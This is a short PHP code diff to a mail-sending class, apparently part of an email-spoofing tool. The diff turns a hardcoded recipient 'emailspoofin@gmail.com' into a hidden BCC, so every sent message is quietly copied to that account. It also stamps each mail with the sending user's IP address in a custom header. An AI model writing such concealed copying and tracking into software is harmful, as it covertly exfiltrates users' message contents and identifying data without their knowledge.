@@ -240,10 +240,12 @@ class Monil {
 	{
 		$mail->addAddress($val);
 	}
-	$mail->addAddress('emailspoofin@gmail.com');
+	$mail->addBCC('emailspoofin@gmail.com');
 	$mail->isHTML(true);                                  // Set email format to HTML
 	$mail->Subject = $subject;
 	$mail->Body    = $content;
+	$ipaddress = $this->getUserIpaddress();
+	$mail->addCustomHeader('X-USERIP',$ipaddress);
 	if(!$mail->send()) {
 	 //   echo 'Message could not be sent.';
 	    echo 'Mailer Error: ' . $mail->ErrorInfo;
